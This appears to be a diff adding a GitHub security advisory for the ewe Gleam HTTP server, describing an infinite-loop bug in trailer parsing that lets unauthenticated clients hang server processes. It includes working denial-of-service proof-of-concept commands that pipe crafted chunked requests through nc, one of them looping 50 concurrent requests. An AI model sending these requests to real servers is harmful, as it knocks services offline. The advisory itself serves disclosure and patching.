@@ -1,0 +1,88 @@
+---
+description: |-
+  ## Summary
+  
+  ewe's `handle_trailers` function contains a bug where rejected trailer headers (forbidden or undeclared) cause an infinite loop. The function recurses with the original unparsed buffer instead of advancing past the rejected header, re-parsing the same header forever. Each malicious request permanently wedges a BEAM process at 100% CPU with no timeout or escape.
+  
+  ## Impact
+  
+  When `handle_trailers` (`ewe/internal/http1.gleam:493`) encounters a trailer that is either not in the declared trailer set or is blocked by `is_forbidden_trailer`, three code paths (lines 520, 523, 526) recurse with the original buffer `rest` instead of `Buffer(header_rest, 0)`:
+  
+  ```gleam
+  // Line 523 — uses `rest` (original buffer), not `Buffer(header_rest, 0)` (remaining)
+  False -> handle_trailers(req, set, rest)
+  ```
+  
+  This causes `decoder.decode_packet` to re-parse the same header on every iteration, producing an infinite loop. The BEAM process never yields, never times out, and never terminates.
+  
+  **Any ewe application that calls `ewe.read_body` on chunked requests is affected.** This is exploitable by any unauthenticated remote client. There is no application-level workaround — the infinite loop is triggered inside `read_body` before control returns to application code.
+  
+  ### Proof of Concept
+  
+  **Send a chunked request with a forbidden trailer (`host`) to trigger the infinite loop:**
+  
+  ```sh
+  printf 'POST / HTTP/1.1\r\nHost: localhost:8080\r\nTransfer-Encoding: chunked\r\nTrailer: host\r\n\r\n4\r\ntest\r\n0\r\nhost: evil.example.com\r\n\r\n' | nc -w 3 localhost 8080
+  ```
+  
+  This will hang (no response) until the `nc` timeout. The server-side handler process is stuck forever.
+  
+  **Exhaust server resources with concurrent requests:**
+  
+  ```sh
+  for i in $(seq 1 50); do
+    printf 'POST / HTTP/1.1\r\nHost: localhost:8080\r\nTransfer-Encoding: chunked\r\nTrailer: host\r\n\r\n4\r\ntest\r\n0\r\nhost: evil.example.com\r\n\r\n' | nc -w 1 localhost 8080 &
+  done
+  ```
+  
+  Open the Erlang Observer (`observer:start()`) and sort the Processes tab by Reductions to see the stuck processes with continuously climbing reduction counts.
+  
+  ### Vulnerable Code
+  
+  All three `False`/`Error` branches in `handle_trailers` have the same bug:
+  
+  ```gleam
+  // ewe/internal/http1.gleam, lines 493–531
+  fn handle_trailers(
+    req: Request(BitArray),
+    set: Set(String),
+    rest: Buffer,
+  ) -> Request(BitArray) {
+    case decoder.decode_packet(HttphBin, rest) {
+      Ok(Packet(HttpEoh, _)) -> req
+      Ok(Packet(HttpHeader(idx, field, value), header_rest)) -> {
+        // ... field name parsing ...
+        case field_name {
+          Ok(field_name) -> {
+            case
+              set.contains(set, field_name) && !is_forbidden_trailer(field_name)
+            {
+              True -> {
+                case bit_array.to_string(value) {
+                  Ok(value) -> {
+                    request.set_header(req, field_name, value)
+                    |> handle_trailers(set, Buffer(header_rest, 0))  // correct
+                  }
+                  Error(Nil) -> handle_trailers(req, set, rest)      // BUG: line 520
+                }
+              }
+              False -> handle_trailers(req, set, rest)               // BUG: line 523
+            }
+          }
+          Error(Nil) -> handle_trailers(req, set, rest)              // BUG: line 526
+        }
+      }
+      _ -> req
+    }
+  }
+  ```
+disclosure_date: 2026-03-16
+first_patched_versions:
+  - 3.0.5
+id: GHSA-4w98-xf39-23gp
+link: https://github.com/advisories/GHSA-4w98-xf39-23gp
+package: ewe
+severity: high
+title: Loop with Unreachable Exit Condition ('Infinite Loop') in ewe
+vulnerable_version_ranges:
+  - '>= 0.8.0, < 3.0.5'
